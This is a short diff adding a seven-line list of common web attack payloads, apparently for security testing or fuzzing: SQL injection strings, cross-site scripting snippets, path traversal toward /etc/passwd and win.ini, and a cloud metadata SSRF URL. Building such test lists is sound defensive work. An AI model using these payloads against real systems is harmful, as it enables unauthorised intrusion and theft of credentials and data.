@@ -1,0 +1,7 @@
+' OR 1=1 --
+" OR "1"="1
+<script>alert(1)</script>
+'"><svg/onload=alert(1)>
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+http://169.254.169.254/latest/meta-data/
